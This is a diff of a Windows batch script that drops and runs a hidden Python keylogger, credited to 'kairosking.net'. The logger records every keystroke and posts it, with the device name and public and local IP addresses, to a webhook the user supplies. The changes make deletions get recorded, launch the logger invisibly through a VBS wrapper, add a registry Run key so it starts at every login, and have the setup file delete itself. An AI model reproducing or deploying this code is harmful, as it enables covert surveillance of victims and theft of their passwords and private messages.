@@ -8,7 +8,7 @@ for /f "useback delims=" %%_ in (%0) do (
 goto :next
 
 ___DATA___
-#made by kairös :)
+#made by https://kairosking.net :)
 from pynput.keyboard import Listener # pip install requests
 from threading import Timer
 import requests # pip install requests
@@ -17,6 +17,7 @@ import socket
 msg = ""
 wait_between_send = 5 # in seconds
 webhook_url = "" # put your webhook url in the quotes
+api_key = "" # put your geolocation api key between the quotes > ipgeolocation.io <
 
 def on_press(key):
     try:
@@ -29,10 +30,10 @@ def on_press(key):
         elif str(key) == "Key.enter":
             msg += "\n"
         elif str(key) == "Key.backspace":
-            if len(msg.replace("↞", "")) > 0:
-                msg = msg[:-1]
-            else:
-                msg += "↞"
+            #if len(msg.replace("↞", "")) > 0:
+                #msg = msg[:-1]
+            #else:
+            msg += "↞"
     except Exception as e:
         headers = {"content-type": "application/json"}
         json = {"content": f"```error: {e}```"}
@@ -43,7 +44,7 @@ def send():
         global msg
         if len(msg) > 0:
             headers = {"content-type": "application/json"}
-            ip = requests.get("https://api.ipgeolocation.io/getip?apiKey=", headers=headers).json()["ip"] # put your geolocation api key after ?apiKey=
+            ip = requests.get(f"https://api.ipgeolocation.io/getip?apiKey={api_key}", headers=headers).json()["ip"]
             json = {"content": f"```\nDevice Name: {socket.gethostname()}\nPublic Ip: {ip}\nLocal Ip: {socket.gethostbyname(socket.gethostname())}\n\n{msg}\n```"}
             r = requests.post(webhook_url, headers=headers, json=json)
             msg = ""
@@ -61,7 +62,16 @@ ___ATAD___
 
 :next
 
-echo CreateObject^(^"Wscript.Shell^"^).Run ^"runpy.bat^"^, 0^, True > RUNME.vbs
+echo getpath = Wscript.ScriptFullName > RUNME.vbs
+echo Set objFSO = CreateObject^(^"Scripting.FileSystemObject^"^) >> RUNME.vbs
+echo Set thefile = objFSO.GetFile^(getpath^) >> RUNME.vbs
+echo getfolder = objFSO.GetParentFolderName(thefile) ^& ^"\runpy.bat^" >> RUNME.vbs
+echo CreateObject^(^"Wscript.Shell^"^).Run Chr^(34^) ^& getfolder ^& Chr^(34^)^, 0^, True >> RUNME.vbs
 echo ^@echo off > runpy.bat
+echo cd /d %%~dp0 >> runpy.bat
 echo python pynlog.pyw >> runpy.bat
+
+set curpath=%~dp0
+reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "RUNME" /t REG_SZ /F /D "%curpath%RUNME.vbs"
+
 del "setupstuff.bat"
